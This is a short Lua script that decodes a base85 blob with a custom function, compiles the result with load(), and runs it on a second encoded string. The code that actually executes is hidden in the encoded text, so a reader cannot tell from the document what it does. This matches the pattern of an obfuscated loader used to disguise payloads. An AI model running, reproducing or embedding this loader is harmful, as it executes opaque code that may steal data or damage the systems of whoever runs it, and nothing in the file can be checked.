
local function hwEVemdstt(s)
    local m = {}
    local c = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
    for i=1,85 do m[string.byte(c,i)] = i-1 end
    local o, v, n, p = {}, 0, 0, {52200625, 614125, 7225, 85, 1}
    for i=1, #s do
        local x = m[string.byte(s,i)]
        if x then
            v = v + x * p[n+1]
            n = n + 1
            if n == 5 then
                table.insert(o, string.char(math.floor(v/16777216), math.floor((v%16777216)/65536), math.floor((v%65536)/256), v%256))
                v, n = 0, 0
            end
        end
    end
    return table.concat(o)
end
local vm_func = load(hwEVemdstt("3T$s<VQe68baiS(d0}E%S|B|jb98cPZf7oIXkl_FF*7nPGB7MMI4d+YEHgGMGcqhTF)J}QEIBeQGBGSMG&n6XI4m|WD={}LF)=wUGcqhVGb=GREI2tUF*PhUI4d$REHN`OEiyGMI5sUaGb}MPIW06XEHN}REi*SPF*P?WG&C$RGcqkQG%PnaD>E`IH!v+RHY_(cD>5)FHaRUZH!LwQF)J}PEHN@TEiySQF*7+WGdL_YHY+kREI2hSF*PhSI4d(WEHN`OEiyPPF)=eOGBhkUF)K7OEI2kTGC3?aFe@}MDGF?FV_|F{W_503bZKvHAZc=DZAVUedPH(4VJu=PAZ%}AVQe69EMq+}EHFDDcW7yBWguZbFd$)WWFTTbFd$@aAZ%}AVQe6BVJvcDJz*s>EMg@xJ0NLhAaY@TJ#u0obZBL6AY(maD{vrXZe%+kVJu=Sa6KqtEplNgFET7BVl8rFDK9cCa4Ir8AZ2c3J0NLhAYnXWAarPDZXjVjVjyL1WIG^tXlZO^AYnc*AY^YKY;R*>Y#?%BJz*s>J0NLhAaY?oFd%ejWo{s2J!30yAZ2c3J0M{!a6KqtEplNgFET7}Dl$7DWo~3UAaZ4Nb#iVXV>=*aZe%+OY;R*>Y#?TJZew(5Z*Cw<b3|-MPiatTPAFt7AZsZKARr(hY;R*>Y#?(WJs^91AZBlJAZa}?EHX7UAY^YKb6aU$J!v3iZe$7|ARr)YZ)0I>AZj2zATSCbARr)SZ*m}MJuoaXH8mh)ZweqFARr(hARuZWJs>D*AS)nqTWMV&D<E@pa%pa7E@F9fWhiSbASh`dB_JbfDIhB#F)1k^B_J|2HVPmhARr(hARu#FX<aNJb6aX%AUz;+TWVb_Aah%3T?!x|ARuLKWC|c4ARugSV_|F{X)GXbb#yEsY9KuzFf1T@eJmg_3LqdLAZBlJAZcWHJuxgGBV-_CZweqFARr(hARuWVJs>D)AS)m-DIg^vGBq{|ARr(hARr(hY9KuzC~6=pAah%3T`3?XATl*J3LqdLARr(hAah%3T`VATTWVb(Js@*iYF#WKb6aU$3LqdLARr(hAa8YaTO)6EbSp7kAUz;+baH8KXD(xCVR9&Ga%OEuPI`Joawv0ja%pa7E@F9fWhi7UAZcWHDJ&p!TPSl|X<Z;IAah%4T`3?XATl*JT`4IFARr(hWo~2&ARr(ha%FUNa&91WVPb4$E@N+QV_|eCZ*_Dj3T19&3UXz1b#iVXW_503bZKvHC~#k5I5jB>ARr(hY;R*>Y#?o6a3DP(dwmKZARr)YZ)0I>AY*7@a&sU(AR;g^GBY$aHa9pqK|(`BMMg(RNlHshO-@fxQBqS>RaRG6Sz2LYV`OD!XJ~0^Yiw<9Z*XyPb98lfcX)YvAtNLuCMYQ?D=j-bJw87`USD8)e0_c*3LqdLAZBlJAZa}@EI2hFWN#pCVQ^b>baH8KXD(uSbY&=GXkl`5ENLlSAUz;yEioWvZe$7|ARr)YZ)0I>Aa8YaEFgAaY%CydEFf?oJs^91EFdr}ATTT-do?mLFfcYUH7p=DF*GqUH7p=EGBPzRAUHKFATfOkARr(hW^ZyJX+1G4AR};JVmLJ*WN!)}ARr(hARr)YZ)0I>Aa)=<AZ=lATXS@BX>MmOVtI6BC~#k5I5jLFX(?R_ARr(hARr(hX=WgHAarPDZVDhEARr(hARr(hARu;OY#==#c42HFD<F0tDj;xMZYwce3LqdLARr(hARr(hAZ{Q%AZ{QlATbIcARr(hARr(hARr)VW*}}LJv|^bAarPDZVDhEARr(hARr(hARr(hARu&MVr*qDX>N06a&#zfb#yEsb98cPZf7oIXkl_FZDDk1E@o_RZ*nMhVQeokHa9mnGBGwOEFf)RbZ9PSY;SLJC@6MeY$Y)^H#avjF*YeLHZ?UfHYqG1ZDDk1E@o_RZ*nLoc42HKHZ?UfHYqPMH8v?MAa-GFB{DTODJcpdARr(hARr(hARr(hARr)iVQefQZXi7%Ff1T23LqdLARr(hARr(hAZ2c33LqdLARr(hAZ2c33LqdLAZ2c33LqdLAZ%}AVQe6BWpf}sAWL&ZY)4ONP-#vmbYWs_WiDfHZew9|C~tLiDJ&pwbaiS(d0}E%S}6)3ARr)YZ)0I>AZ8#vAZ%}8WGHfFb14cSARr)VW*}xDbZBL6AZ92jAZ2c33T19&3I"))
if vm_func then vm_func()("ApB1XHb8L^m9*3Xs;;~cDDZOiPdB)*$nsk8v`pEfVwuH11lY<=l4;6S24)G`o_tc$RWRb<5St2=peuCkUbYHltnZ^Y8}*v5!<ZlV6d!THqVS&ATBPz$z3oBkmdF<U8MbYm0`Yet?+@(h#m}3RZTyFCj$-W@c(oD|-6DPm=e@JZx456;*iLR4Z%i;`1+D7-Qjfl`uA3?z+M$zD`yaQDHiaukGvae)1vR942nk(WEysi~@YmG=ART%N`c7Mn=U1@PqvZ@?8#sH9;&Pd>#XZy") end
